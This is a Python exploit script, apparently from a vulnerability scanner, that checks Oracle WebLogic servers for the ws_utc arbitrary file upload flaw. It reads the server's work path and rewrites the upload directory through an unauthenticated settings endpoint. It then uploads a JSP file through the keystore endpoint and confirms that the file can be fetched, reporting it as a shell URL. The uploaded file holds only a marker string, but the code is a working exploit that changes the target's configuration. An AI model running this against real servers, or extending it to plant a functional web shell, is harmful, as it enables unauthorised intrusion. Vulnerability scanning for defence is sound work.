#-*- coding: utf-8 -*-

import re
import sys
import time
import argparse
import requests
import traceback
import xml.etree.ElementTree as ET

def get_current_work_path(host):
    geturl = host + "/ws_utc/resources/setting/options/general"
    ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'}
    values = []
    try:
        request = requests.get(geturl,verify=False,timeout=5)
        if request.status_code == 404:
            values.append('errer')
            return False,values[0]
        elif "Deploying Application".lower() in request.text.lower():
            print("[*] First Deploying Website Please wait a moment ...")
            time.sleep(20)
            request = requests.get(geturl, headers=ua,verify=False,timeout=5)
        if "</defaultValue>" in request.content:
            root = ET.fromstring(request.content)
            value = root.find("section").find("options")
            for e in value:
                for sub in e:
                    if e.tag == "parameter" and sub.tag == "defaultValue":
                        values.append(sub.text)
    except Exception as e:
        values.append(str(e))
        return False, values[0]
    if values:
        return True,values[0]
    else:
        e = "[-] Cannot get current work path\n"
        values.append(e)
        return False,values[0]

def get_new_work_path(host):
    (flag,origin_work_path) = get_current_work_path(host)
    if flag == False:
        error_message = 'cccccccccccccccxxxxxxxxxxdddddddddd'
        return error_message
    else:
        pass
    works = "/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
    if "user_projects" in origin_work_path:
        if "\\" in origin_work_path:
            works = works.replace("/", "\\")
            current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects\\domains"
            dir_len = len(current_work_home.split("\\"))
            domain_name = origin_work_path.split("\\")[dir_len]
            current_work_home += "\\" + domain_name + works
        else:
            current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects/domains"
            dir_len = len(current_work_home.split("/"))
            domain_name = origin_work_path.split("/")[dir_len]
            current_work_home += "/" + domain_name + works
    else:
        current_work_home = origin_work_path
        print("[*] cannot handle current work home dir: {}".format(origin_work_path))
    return current_work_home

def set_new_upload_path(host,path):
    if path == 'cccccccccccccccxxxxxxxxxxdddddddddd':
        return False
    else:
        pass
    data = {
        "setting_id": "general",
        "BasicConfigOptions.workDir": path,
        "BasicConfigOptions.proxyHost": "",
        "BasicConfigOptions.proxyPort": "80"}
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest', }
    try:
        request = requests.post(host + "/ws_utc/resources/setting/options", data=data, headers=headers,verify=False,timeout=5)
        if "successfully" in request.content:
            return True
        else:
            return False
    except Exception:
        return False

def upload_webshell(host, uri):
    flag = set_new_upload_path(host, get_new_work_path(host))
    if flag == False:
        shell_path = 'cccccccccccccccxxxxxxxxxxdddddddddd'
        return False,shell_path
    else:
        pass
    password = "ntlab"
    upload_content = "ntlab test"
    files = {
        "ks_edit_mode": "false",
        "ks_password_front": password,
        "ks_password_changed": "true",
        "ks_filename": ("ntlab.jsp", upload_content)
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest', }
    try:
        request = requests.post(host + uri, files=files)
        response = request.text
        match = re.findall("<id>(.*?)</id>", response)
        if match:
            tid = match[-1]
            shell_path = host + "/ws_utc/css/config/keystore/" + str(tid) + "_ntlab.jsp"
            if upload_content in requests.get(shell_path, headers=headers).content:
                return True,shell_path
            else:
                shell_path = 'cccccccccccccccxxxxxxxxxxdddddddddd'
                return False,shell_path
        else:
            shell_path = 'cccccccccccccccxxxxxxxxxxdddddddddd'
            return False,shell_path
    except Exception:
        shell_path = 'cccccccccccccccxxxxxxxxxxdddddddddd'
        return False,shell_path

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if weblogic arbitrary file upload vul')
    pocurl = "/ws_utc/resources/setting/keystore"
    try:
        (flag,path) = upload_webshell(url,pocurl)
        if flag == True:
            msg = 'There is weblogic arbitrary file upload vul on url: ' + url + ' with shell url: ' + path + '  .'
            number = 'v105'
            return True, url, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no weblogic arbitrary file upload vul'
    number = 'v0'
    return False,url,number,msg




